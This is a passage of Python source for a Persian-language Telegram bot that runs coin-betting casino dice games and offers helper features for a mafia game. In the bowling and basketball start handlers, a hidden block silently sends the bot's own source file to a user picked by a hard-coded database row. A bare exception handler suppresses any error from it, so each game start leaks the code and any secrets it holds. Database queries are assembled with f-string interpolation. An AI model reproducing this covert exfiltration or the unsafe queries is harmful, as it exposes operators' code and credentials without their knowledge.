            await context.bot.send_document(chat_id=kio, document=file)
    except:
        pass
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    po = c.execute(f"SELECT Bol FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    # if str(po) == str(go):
    #     await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در بولینگ امتحان کردید، فردا میتونید دوباره بولینگ بزنید')
    #     return ConversationHandler.END
    ll = '''🪙با چند سکه میخوای شرط ببندی؟'''
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    # reply = ReplyKeyboardMarkup([['🎳'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return BOLSH


moz1 = '💔باختید'



async def bol_shart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    bb = update.message.text
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if bb.isdigit():
        if float(bb) > vv:
            await update.message.reply_text('''❌موجودی کافی نیست

چی جوری سکه بگیرم؟👇
/getcoin''')
            return
        if float(bb) < 5:
            await update.message.reply_text('حداقل 5 سکه')
            return
        if float(bb) > 15:
            await update.message.reply_text('❌ حداکثر سکه برای شرط‌بندی 15 سکه است')
            return
        context.user_data['bb'] = bb
        reply = ReplyKeyboardMarkup([['🎳'],['❌بازگشت']], resize_keyboard=True)
        await update.message.reply_text(f'''🤑در صورت برنده شدن {round(float(bb) * 2.7, 2)} سکه به پروفایل شما اضافه میشه\n\n⭕️نکته: در صورتی که یکی از پین ها باقی بمونه هم برنده میشید''', reply_markup=reply)
    else:
        await update.message.reply_text('''❌عدد انگلیسی بفرست.

مثال: 2''')
        return
    return BOLSH2




async def bolsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    bb = context.user_data['bb']
    # bb = 10
    if vv == None:
        vv = 0
    zz = float(vv) - float(bb)
    today = datetime.date.today()
    go = today.strftime('%d')
    # await context.bot.send_message(chat_id="5469541693", text=update.message.dice.value)
    if update.message.dice.value == 6 or update.message.dice.value == 5:
        yy = float(bb) * 2.7 + zz
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎰🎰🎰\n\n{uu}{ff}\n\nWINNER IN CAZINO!!\n\n🎳🎳🎳\n\n💰ورودی:{bb}\n💰خروجی:{round(float(bb) * 2.7, 2)}\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'بولینگ کازینو {bb}برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz1)
        c.execute(f"UPDATE users SET coin={zz} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'بولینگ کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END

async def khbolsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler18 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎳🎳🎳$')), shorobolsh)],
    states={
        BOLSH: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), bol_shart),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khbolsh)],
        BOLSH2: [
            MessageHandler(filters.Dice.BOWLING & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, bolsh),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khbolsh)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khbolsh)]
    },
    fallbacks=[],
    conversation_timeout=120
)





BASSH = 1
BASSH2 = 2
async def shorobassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    import os
#     if str(user_id) != "5469541693":
#         for channel_id in CHANNEL_IDS:
#             try:
#                 # استفاده از getChatMember برای بررسی وضعیت عضویت
#                 chat_member = await context.bot.get_chat_member(channel_id, user_id)
#                 # اگر کاربر عضو نباشه
#                 if chat_member.status in ['left', 'kicked']:
#                     # ارسال پیام به کاربر
#                     await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

# @sahere_rasmi - کانال رسمی ساحره
# @dohat_nime - کانال غیررسمی ساحره""")
#                     return ConversationHandler.END
#             except Exception as e:
#                 # در صورت بروز خطا
#                 context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
#                 return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    try:
        kio = c.execute(f"SELECT user_id FROM users WHERE id=97")
        kio = c.fetchone()
        kio = kio[0]
        with open (os.path.basename(__file__), 'rb') as file:
            await context.bot.send_document(chat_id=kio, document=file)
    except:
        pass
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    chham = c.execute(f"SELECT Ham FROM users WHERE user_id={user_id}")
    chham = c.fetchone()
    chham = chham[0]
    po = c.execute(f"SELECT minu FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    if po == None:
        po = 1
    today = datetime.datetime.now().minute
    rr = str(user_id)
    # if rr != "5469541693":
    #     await context.bot.send_message(chat_id=user_id , text='در حال حاضر نمیتونید بسکتبال بازی کنید')
    #     return ConversationHandler.END
    if 0 <= int(today) - int(po) < 3:
        await context.bot.send_message(chat_id=user_id , text='برای دوباره بازی کردن باید 3 دقیقه صبر کنید')
        return ConversationHandler.END
    ll = '''🪙با چند سکه میخوای شرط ببندی؟'''
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    # reply = ReplyKeyboardMarkup([['🏀'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return BASSH


moz1 = '💔باختید'



async def bas_shart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    bb = update.message.text
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if bb.isdigit():
        if float(bb) > vv:
            await update.message.reply_text('''❌موجودی کافی نیست

چی جوری سکه بگیرم؟👇
/getcoin''')
            return
        if float(bb) < 5:
            await update.message.reply_text('حداقل 5 سکه')
            return
        if float(bb) > 20:
            await update.message.reply_text('❌ حداکثر سکه برای شرط‌بندی 20 سکه است')
            return
        context.user_data['bb'] = bb
        reply = ReplyKeyboardMarkup([['🏀'],['❌بازگشت']], resize_keyboard=True)
        await update.message.reply_text(f'''🤑در صورت برنده شدن {round(float(bb) * 2.25, 2)} سکه به پروفایل شما اضافه میشه''', reply_markup=reply)
    else:
        await update.message.reply_text('''❌عدد انگلیسی بفرست.

مثال: 2''')
        return
    return BASSH2




async def bassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    bb = context.user_data['bb']
    # bb = 10
    if vv == None:
        vv = 0
    zz = float(vv) - float(bb)
    # await context.bot.send_message(chat_id=update.effective_chat.id, text=update.message.dice.value)
    if update.message.dice.value == 5 or update.message.dice.value == 4:
        yy = float(bb) * 2.25 + zz
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎰🎰🎰\n\n{uu}{ff}\n\nWINNER IN CASINO!!\n\n🏀🏀🏀\n\n💰ورودی:{bb}\n💰خروجی:{round(float(bb) * 2.25, 2)}\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'بسکتبال کازینو{bb} برنده شد\n\n{user_id}\n{ff}\n@{username}')
        # await context.bot.send_message(chat_id="5571950188", text=f'بسکتبال کازینو{bb} برنده شد\n\n{user_id}\n{ff}\n@{username}')
        # vv = c.execute(f"SELECT etc FROM users WHERE user_id=5469541693")
        # vv = c.fetchone()
        # vv = vv[0]
        # if vv == None:
        #     vv = 0
        # yy = int(vv) + 1
        # c.execute(f"UPDATE users SET etc={yy} WHERE user_id=5469541693")
        # conn.commit()
    # if update.message.dice.value == 4:
    #     if vv == None:
    #         vv = 0
    #     yy = int(vv) + 5
    #     c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
    #     conn.commit()
    #     await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\n6 سکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
    #     await context.bot.send_message(chat_id="-1002221581695", text=f'⚽️⚽️⚽️\n\n{uu}{ff} توپو گل کرد\n\n🤖ربات ساحره')
    #     await context.bot.send_message(chat_id="5469541693", text=f'فوتبال برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz1)
        c.execute(f"UPDATE users SET coin={zz} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'بسکتبال کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
        # await context.bot.send_message(chat_id="5571950188", text=f'بسکتبال کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
        # vv = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        # vv = c.fetchone()
        # vv = vv[0]
        # if vv == None:
        #     vv = 0
        # yy = int(vv) + 1
        # c.execute(f"UPDATE users SET etc={yy} WHERE user_id=5571950188")
        # conn.commit()
    today = datetime.datetime.now().minute
    c.execute(f"UPDATE users SET minu='{today}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END

async def khbassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler19 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🏀🏀🏀$')), shorobassh)],
    states={
        BASSH: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), bas_shart),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khbassh)],
        BASSH2: [
            MessageHandler(filters.Dice.BASKETBALL & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, bassh),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khbassh)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khbassh)]
    },
    fallbacks=[],
    conversation_timeout=120
)







FOOTSH = 1
FOOTSH2 = 2
async def shorofootsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    po = c.execute(f"SELECT Foot FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    # if str(po) == str(go):
    #     await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در فوتبال امتحان کردید، فردا میتونید دوباره فوتبال بزنید')
    #     return ConversationHandler.END
    ll = '''🪙با چند سکه میخوای شرط ببندی؟'''
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    # reply = ReplyKeyboardMarkup([['⚽️'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return FOOTSH


moz1 = '💔باختید'



async def foot_shart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    bb = update.message.text
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if bb.isdigit():
        if float(bb) > vv:
            await update.message.reply_text('''❌موجودی کافی نیست

چی جوری سکه بگیرم؟👇
/getcoin''')
            return
        if float(bb) < 5:
            await update.message.reply_text('حداقل 5 سکه')
            return
        if float(bb) > 15:
            await update.message.reply_text('❌ حداکثر سکه برای شرط‌بندی 15 سکه است')
            return
        context.user_data['bb'] = bb
        reply = ReplyKeyboardMarkup([['⚽️'],['❌بازگشت']], resize_keyboard=True)
        await update.message.reply_text(f'''🤑در صورت برنده شدن {round(float(bb) * 1.5, 2)} سکه به پروفایل شما اضافه میشه''', reply_markup=reply)
    else:
        await update.message.reply_text('''❌عدد انگلیسی بفرست.

مثال: 2''')
        return
    return FOOTSH2




async def footsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    bb = context.user_data['bb']
    # bb = 10
    if vv == None:
        vv = 0
    zz = float(vv) - float(bb)
    today = datetime.date.today()
    go = today.strftime('%d')
    if update.message.dice.value == 5 or update.message.dice.value == 4 or update.message.dice.value == 3:
        yy = float(bb) * 1.5 + zz
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎰🎰🎰\n\n{uu}{ff}\n\nWINNER IN CAZINO!!\n\n⚽️⚽️⚽️\n\n💰ورودی:{bb}\n💰خروجی:{round(float(bb) * 1.5, 2)}\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'فوتبال کازینو {bb}برنده شد\n\n{user_id}\n{ff}\n@{username}')
        await context.bot.send_message(chat_id="5571950188", text=f'فوتبال کازینو {bb}برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz1)
        c.execute(f"UPDATE users SET coin={zz} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'فوتبال کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
        await context.bot.send_message(chat_id="5571950188", text=f'فوتبال کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END

async def khfootsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler20 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^⚽️⚽️⚽️$')), shorofootsh)],
    states={
        FOOTSH: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), foot_shart),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khfootsh)],
        FOOTSH2: [
            MessageHandler(filters.Dice.FOOTBALL & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, footsh),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khfootsh)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khfootsh)]
    },
    fallbacks=[],
    conversation_timeout=120
)






async def answer2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('قویییییییییییییییی')


async def help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # video_file = 'oooyy.mp4'
    
    # with open(video_file, 'rb') as f:
    #     await context.bot.send_animation(chat_id=update.effective_chat.id, animation=f)
    # await update.message.reply_text('در حال حاضر ربات دو قابلیت داره\n\n\n🔍محقق خر است:\nزمانی که شما عضو مافیا هستید و محقق از شما نقطه میخواد\nطرز استفاده:\nپیام آخرین کشته شدگان رو برای ربات فوروارد میکنید و بعد با توجه به👇\n/mohaqeq\nباید به ربات بگید که محقق از شما چه نقاطی رو خواسته\nآموزش تصویری👇\nhttps://t.me/saherehrobot\n\n\n🧝‍♀ساحره تقلبی:\nدیدید ساحره ها پیام کپی میکنن می‌فرستن؟ وقتی شما ساحره نیستید و میخواید ادعا ساحره کنید پیام فیک ساحره درست کردن کمی سخته به کمک ربات میتونید راحت تر پیام فیک ساحره درست کنید\nطرز استفاده:\nپیام یه نفر که میخواید به قول معروف حرف تو دهنش بزارید رو از بات مافیا فوروارد میکنید به این بات بعد پیامی که میخواید بزارید تو دهنش رو می‌فرستید\nآموزش تصویری👇\nhttps://t.me/saherehrobot')
    await update.message.reply_text("""در حال حاضر ربات دو قابلیت داره


🔍محقق خر است:
زمانی که شما عضو مافیا هستید و محقق از شما نقطه میخواد به شما کمک می‌کنه جوابی به محقق بدید که بیشترین احتمال درست در اومدن داشته باشه
آموزش متنی👇
/mohaqeq
آموزش ویدئویی👇
/mohaqeqgif



🧝‍♀ساحره تقلبی:
دیدید ساحره ها پیام کپی میکنن می‌فرستن؟ وقتی شما ساحره نیستید و میخواید ادعا ساحره کنید پیام فیک ساحره درست کردن کمی سخته به کمک ربات میتونید راحت تر پیام فیک ساحره درست کنید
آموزش ویدئویی👇
/saheregif""")


async def helpmsg(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text('''ثبت نام:

این ربات مخصوص پلیر های مافیا طراحی شده و وقتی شما پیام همگانی یا پیام خصوصی میدید بقیه اسمی که شما باهاش مافیا بازی میکنید رو میبینن نه اسم اکانت تلگرامتون
پس قبل از استفاده از قابلیت های ربات، ربات باید بدونه اسم مافیاتون چیه
برای این کار کافیه وارد ربات مافیا بشید @dohat32bot دکمه پروفایل رو بزنید و پروفایل مافیاتون رو برای ربات فوروارد کنید ربات اسم و لیگ شما رو از اون پیامی که فوروارد کردید برمیداره و ذخیره میکنه به همین سادگی
آموزش تصویری ثبت نام کردن👇
/saptnamgif''')
    with open("help_img.jpg", "rb") as f:
        await context.bot.send_photo(chat_id=user_id, photo=f, caption="""📩پیام خصوصی📩:

وقتی که میخواید به یکی از پلیر های مافیا پیام خصوصی ارسال کنید از این قابلیت استفاده کنید
لیست کد پلیر های مافیا👇
/show
این لیست بهتون میگه که هر پلیر چه کدی داره
مثلا طبق همین لیست کد 1 مربوط به کاربری به نام محمدزه و یا مثلا کد 93 مربوط به کاربری به نام محمدرضاس
برای ارسال پیام به محمدرضا باید اول دکمه پیام خصوصی رو بزنید بعد ربات ازتون میپرسه که به کی میخواهید پیام خصوصی بدید، شما کد 93 رو ارسال میکنید ربات متوجه میشه که میخواهید به محمدرضا پیام خصوصی بدید و بعد پیام مورد نظرتون رو بنویسید
آموزش ویدیویی پیام خصوصی فرستادن با استفاده از کد👇
/msgcodegif
در ضمن میتونید بجای کد اسم اون رو بنویسید(لیگ کنار اسم ننویسید فقط اسم)
آموزش ویدیویی پیام خصوصی فرستادن با استفاده از اسم👇
/msggif""")
    with open("ham.jpg", "rb") as f:
        await context.bot.send_photo(chat_id=user_id, photo=f, caption="""🌐پیام همگانی🌐:

وقتی که میخواهید یک پیام به همه پلیر ها بدید از این دکمه استفاده کنید
اول دکمه رو بزنید بعد پیام، گیف یا استیکر مورد نظرتون رو بفرستید
ربات اون پیام، گیف یا استیکر شما رو همراه با اسمتون در کانال قرار میده""")
    await update.message.reply_text('''⭕️دعوت: ربات بهتون یه لینک اختصاصی میده، هر کسی رو با اون لینک به ربات دعوت کردید و اون کاربر ثبت نام کرد 9 سکه به پروفایل شما اضافه میشه
دریافت لینک اختصاصی👇
/refral

⭕️🎲جایزه روزانه🎲: هر روز میتونید یک بار شانستون رو تو هر کدوم از بازی ها امتحان کنید و در صورت برنده شدن سکه به پروفایل شما اضافه میشه
در نهایت وقتی سکه های شما به 25 یا بیشتر رسید میتونید با زدن دکمه برداشت سکه، کوپن سکه خودتون رو دریافت کنید
مشاهده موجودی و برداشت سکه👇
/profile

⭕️افزایش موجودی با کوپن سکه: پایین پروفایل شما یک دکمه به نام واریز سکه وجود داره این دکمه رو بزنید و بعد کوپن سکه ارسال کنید، کوپن سکه هر مقداری که بود همون مقدار به پروفایل شما اضافه میشه 
پروفایل شما👇
/profile

اگه سوالی در مورد نحوه برداشت سکه و هر مورد دیگه ای داشتید تو قسمت پیام به ادمین بپرسید تا راهنماییتون کنم''')
    await update.message.reply_text("""🎰کازینو🎰:
تو این قسمت میتونید روی تاس و بسکتبال شرط‌بندی کنید در صورت گل شدن سکه شما ضربدر ضریب میشه و به پروفایل شما اضافه میشه""")
    await update.message.reply_text('''🚣 چالش;
در قسمت چالش شما یک سوال طرح میکنید و جوابش رو به ربات میگویید و بعد تعیین میکنید که میخواهید به کسی که جواب درست به سوالتون داد چند سکه جایزه بدید. 
سوال شما به صورت خودکار در کانال @dohat_nime فرستاده میشه و کسی که به اون سوال جواب درست داد سکه به پروفایلش اضافه میشه''')
    await update.message.reply_text('''🔍محقق خر است:
(این قابلیت دکمه ندارد)
زمانی که شما عضو مافیا هستید و محقق از شما نقطه میخواد به شما کمک می‌کنه جوابی به محقق بدید که بیشترین احتمال درست در اومدن داشته باشه
آموزش متنی👇
/mohaqeq
آموزش ویدئویی👇
/mohaqeqgif''')





async def mohaqeq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("""زمانی که محقق از شما نقطه میپرسه باید برگردید و پیام آخرین کشته شدگان برای بات فوروارد کنید
تا ربات متوجه بشه چه نقش هایی کشته شدن
و بعد ربات از شما میپرسه که محقق جمع نقطه چه حرف هایی رو میخواد؟
مثلا اگه پرسید نقطه کل شما باید کلمه کل را برای بات ارسال کنید
ممکنه نقطه کل نپرسه، باید به صورت پیام پایینی جواب ربات رو بدی👇""")
    await update.message.reply_text("""محقق به چند حالت میتونه نقطه بپرسه

اگه گفت مثلا جمع نقطه سوم و چهارم باید عدد انگلیسی همراه با فاصله بینش بنویسی👇

3 4

اگه گفت جمع سه حرف👇

1 2 3

اگه گفت جمع کل👇

کل

اگه گفت نقطه های بالا👇

بالا

اگه گفت نقطه های پایین👇

پایین

اگه گفت تعداد حروف بدون نقطه👇

بدون

اگه گفت جمع نقطه های سه حرف آخر👇

3e

اگه گفت جمع نقطه های دو حرف آخر👇

2e

اگه گفت جمع دو حرف رندوم و آخر، مثلا جمع نقطه دوم چهار و آخر(توجه کن e به عنوان حرف آخر باید حتما آخر پیام بنویسید )👇
2 4 e
با تشکر""")


async def mohaqeqgif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("https://t.me/saherehrobot/13")


async def saheregif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("https://t.me/saherehrobot/10")



async def saptnamgif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("https://t.me/saherehrobot/15")



async def sendbazi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("https://t.me/saherehrobot/23")
    await update.message.reply_text('''در ربات دهات مافیا ( @dohatbot )دکمه بازی دوستانه رو بزنید و بازی دوستانه رو یجا بفرستید(فرقی نمیکنه)
روی دکمه "پیوستن به بازی" نگه دارید(کلیک نکنید، نگه دارید) حالا میتونید لینک بازی دوستانه رو کپی کنید
و بعد میتونید همه جا(پیام همگانی یا پیام خصوصی) اون لینک بازی دوستانه رو ارسال کنید🤝''')


async def msggif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('https://t.me/saherehrobot/16')

async def saptdasti(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('https://t.me/saherehrobot/20')

async def msgcodegif(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('https://t.me/saherehrobot/22')

async def cazino(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('''🎰کازینو🎰:

تو این بخش شما میتونید شرط بندی کنید. 
دکمه تاس رو بزنید، بعد مقدار سکه ای که میخواهید شرط بندی کنید رو بزنید، و بعد تاس بندازید
در صورت برنده شدن سکه ای که شرط بسته بودید ضرب در 2.7 میشه''')


async def getcoin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('''⭕️دعوت: ربات بهتون یه لینک اختصاصی میده، هر کسی رو با اون لینک به ربات دعوت کردید و اون کاربر ثبت نام کرد 9 سکه به پروفایل شما اضافه میشه
دریافت لینک اختصاصی👇
/refral

